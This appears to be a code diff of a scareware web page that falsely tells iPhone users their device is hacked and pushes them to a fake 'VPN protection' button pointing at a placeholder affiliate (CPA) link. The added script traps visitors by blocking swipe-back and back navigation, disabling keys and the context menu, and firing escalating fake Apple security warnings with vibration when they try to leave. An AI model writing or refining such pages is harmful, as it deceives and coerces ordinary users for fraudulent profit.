@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
     <title>Security Alert</title>
     <style>
         * {
@@ -10,19 +11,20 @@
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #000;
             color: white;
             height: 100vh;
+            height: -webkit-fill-available;
             overflow: hidden;
-            touch-action: manipulation;
+            touch-action: none;
             position: fixed;
             width: 100%;
-            user-select: none;
-            -webkit-user-select: none;
+            -webkit-overflow-scrolling: touch;
         }
         
         .alert-container {
@@ -31,162 +33,93 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            height: -webkit-fill-available;
+            background: radial-gradient(ellipse at center, #450000 0%, #000 80%);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            /* Increased padding to create more black space around the alert box */
-            padding: 50px 20px; /* Top/Bottom 50px, Left/Right 20px */
+            padding: 20px;
         }
         
         .alert-box {
-            background: linear-gradient(135deg, #d10000 0%, #8b0000 100%);
-            border: 3px solid #ff0000;
-            border-radius: 15px; /* Maintains the edge curve square shape */
-            /* Adjusted internal padding for content within the red box */
-            padding: 30px 25px; /* Top/Bottom 30px, Left/Right 25px */
-            width: 100%; /* Will take available width within container's padding */
-            /* Key: Max width set to fit perfectly within a 420px screen
-               (420px screen - 20px left padding - 20px right padding = 380px) */
-            max-width: 380px; 
+            background: linear-gradient(145deg, #6a0000 0%, #300000 100%);
+            border: 2px solid #ff3b30;
+            border-radius: 18px;
+            padding: 25px;
+            width: 100%;
+            max-width: 380px;
             text-align: center;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
-            animation: pulse 1.5s infinite;
+            box-shadow: 0 0 40px rgba(255, 59, 48, 0.6);
+            animation: pulse 2s infinite ease-in-out;
         }
         
         @keyframes pulse {
-            0% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
-            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.9); }
-            100% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
+            0% { box-shadow: 0 0 20px rgba(255, 59, 48, 0.6); }
+            50% { box-shadow: 0 0 50px rgba(255, 59, 48, 0.9); }
+            100% { box-shadow: 0 0 20px rgba(255, 59, 48, 0.6); }
         }
         
         .alert-icon {
-            /* Reduced icon size */
-            width: 50px;
-            height: 50px;
-            margin-bottom: 15px;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 8px rgba(255, 59, 48, 0.8));
         }
         
         h1 {
-            /* Reduced font size for heading */
-            font-size: 20px; 
-            margin-bottom: 15px;
+            font-size: 26px;
+            margin-bottom: 18px;
             color: #fff;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            text-shadow: 0 2px 4px rgba(0,0,0,0.6);
+            font-weight: 700;
         }
         
         p {
-            margin-bottom: 20px;
-            /* Reduced font size for paragraphs */
-            font-size: 15px; 
+            margin-bottom: 22px;
+            font-size: 17px;
             line-height: 1.5;
+            color: #ffb3b3;
         }
         
         .btn-group {
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 14px;
+            margin-top: 25px;
         }
         
         .btn {
-            /* Reduced button padding and font size */
-            padding: 12px; 
+            padding: 18px;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-weight: bold;
-            font-size: 16px; 
+            font-size: 18px;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.15s;
+            -webkit-appearance: none;
         }
         
         .btn-install {
-            background: linear-gradient(to right, #00c853, #00e676);
+            background: linear-gradient(to bottom, #ff3b30, #b20000);
             color: white;
-            box-shadow: 0 4px 0 #009624;
+            box-shadow: 0 5px 0 #800000;
+            text-shadow: 0 1px 1px rgba(0,0,0,0.4);
         }
         
         .btn-install:active {
-            transform: translateY(2px);
-            box-shadow: 0 2px 0 #009624;
+            transform: translateY(3px);
+            box-shadow: 0 2px 0 #800000;
         }
         
         .btn-cancel {
-            background: #333;
-            color: #ccc;
+            background: #1c1c1e;
+            color: #ff9e9e;
+            border: 1px solid #ff3b30;
         }
         
         .btn-cancel:active {
-            background: #444;
-        }
-        
-        .exit-attempts {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #ff9999;
-        }
-        
-        /* Disable zooming and text selection */
-        body {
-            user-select: none;
-            -webkit-user-select: none;
-            touch-action: pan-y;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-10px); }
-            40% { transform: translateX(10px); }
-            60% { transform: translateX(-10px); }
-            80% { transform: translateX(10px); }
-        }
-
-        /* Media Queries for further adjustments on smaller/larger screens */
-        @media (max-width: 420px) {
-            /* If the actual device width is less than 420px, apply these */
-            .alert-container {
-                padding: 30px 10px; /* Reduce padding to avoid too much white space */
-            }
-            .alert-box {
-                padding: 25px 20px; /* Adjust internal padding */
-            }
-            h1 {
-                font-size: 18px;
-            }
-            p {
-                font-size: 14px;
-            }
-            .btn {
-                padding: 10px;
-                font-size: 15px;
-            }
-        }
-
-        @media (max-height: 600px) and (orientation: landscape) {
-            .alert-box {
-                padding: 20px 15px;
-                max-width: 90%; /* Allow it to take up more width on shorter landscape screens */
-            }
-            .alert-icon {
-                width: 40px;
-                height: 40px;
-                margin-bottom: 10px;
-            }
-            h1 {
-                font-size: 17px;
-            }
-            p {
-                font-size: 13px;
-                margin-bottom: 15px;
-            }
-            .btn {
-                padding: 8px;
-                font-size: 13px;
-            }
-            .exit-attempts {
-                margin-top: 10px;
-                font-size: 11px;
-            }
+            background: #2c2c2e;
         }
     </style>
 </head>
@@ -194,69 +127,91 @@
     <div class="alert-container" id="alertContainer">
         <div class="alert-box">
             <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
-            <h1> EMERGENCY SECURITY ALERT ⚠️</h1>
-            <p><strong>YOUR PHONE IS BEING TRACKED!</strong></p>
-            <p>Scammers have changed your device location and can access your:</p>
-            <p>• Bank accounts<br>• Photos<br>• Passwords</p>
+            <h1>⚠️ iOS SECURITY BREACH ⚠️</h1>
+            <p><strong>YOUR IPHONE IS HACKED!</strong></p>
+            <p>We've detected:</p>
+            <p>• Location tracking<br>• iCloud data theft<br>• Banking app infiltration</p>
             <div class="btn-group">
-                <button class="btn btn-install" onclick="window.location.href='https://antivirus-browser.netlify.app/'">
-                    🔒 INSTALL VPN PROTECTION NOW
+                <button class="btn btn-install" onclick="window.location.href='YOUR_CPA_LINK'">
+                    🔒 INSTALL VPN PROTECTION
                 </button>
                 <button class="btn btn-cancel" id="cancelBtn">
-                    CANCEL (RISKY)
+                    CANCEL (DATA AT RISK)
                 </button>
-            </div>
-            <div class="exit-attempts" id="exitAttempts">
-                Warning: 0/7 attempts
             </div>
         </div>
     </div>
 
     <script>
+        // iOS-specific trapping techniques
         let attempts = 0;
-        const maxAttempts = 7;
+        const maxAttempts = 10;
         const cancelBtn = document.getElementById('cancelBtn');
-        const exitAttemptsText = document.getElementById('exitAttempts');
         
-        // Disable back button
+        // 1. Prevent Safari swipe-to-go-back
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        
+        // 2. Block back navigation (works in WKWebView)
         history.pushState(null, null, location.href);
-        window.onpopstate = function(event) {
+        window.onpopstate = function() {
             history.go(1);
-            handleExitAttempt();
+            triggerExitAttempt();
         };
         
-        // Handle exit attempts
-        function handleExitAttempt() {
+        // 3. iOS-specific exit attempts
+        function triggerExitAttempt() {
             attempts++;
-            exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
             
+            const warnings = [
+                "APPLE SECURITY ALERT: Your iPhone is compromised!",
+                "WARNING: Hackers are accessing your iCloud!",
+                "URGENT: Apple Pay credentials being stolen!",
+                "EMERGENCY: Photos and contacts exposed!",
+                "CRITICAL: Banking apps under attack!",
+                "FINAL WARNING: Complete device takeover!",
+                "LAST CHANCE: Install protection now!",
+                "IMMEDIATE ACTION REQUIRED!",
+                "THIS IS YOUR FINAL ALERT!",
+                "REDIRECTING TO SAFETY..."
+            ];
+            
+            // iOS-compatible vibration (works in some browsers)
+            if (navigator.vibrate || navigator.webkitVibrate) {
+                (navigator.vibrate || navigator.webkitVibrate)([200,100,200,100,200]);
+            }
+            
+            // Shake animation that works on iOS
+            const alertBox = document.querySelector('.alert-box');
+            alertBox.style.transform = 'translateX(-10px)';
+            setTimeout(() => { alertBox.style.transform = 'translateX(10px)'; }, 50);
+            setTimeout(() => { alertBox.style.transform = 'translateX(-10px)'; }, 100);
+            setTimeout(() => { alertBox.style.transform = 'translateX(10px)'; }, 150);
+            setTimeout(() => { alertBox.style.transform = 'translateX(0)'; }, 200);
+            
+            // Show alert
             if (attempts < maxAttempts) {
-                const warnings = [
-                    "Your data is still at risk!",
-                    "Scammers are accessing your photos!",
-                    "Bank accounts is visible!",
-                    "Last chance to protect yourself!",
-                    "Security breach detected!",
-                    "Critical danger!",
-                    "Final warning!"
-                ];
-                
-                alert(`⚠️ ${warnings[attempts-1]}`);
-                
-                const alertBox = document.querySelector('.alert-box');
-                alertBox.style.animation = 'none';
-                alertBox.offsetHeight; 
-                alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
+                alert(warnings[attempts-1]);
             } else {
                 window.location.href = "about:blank";
             }
         }
         
-        cancelBtn.addEventListener('click', handleExitAttempt);
+        // 4. Cancel button handler
+        cancelBtn.addEventListener('click', triggerExitAttempt);
         
-        document.addEventListener('touchmove', function(e) {
+        // 5. Prevent new tab opening
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Tab' || e.metaKey) {
+                e.preventDefault();
+            }
+        });
+        
+        // 6. iOS-specific context menu block
+        document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
-        }, { passive: false });
+        });
     </script>
 </body>
 </html>
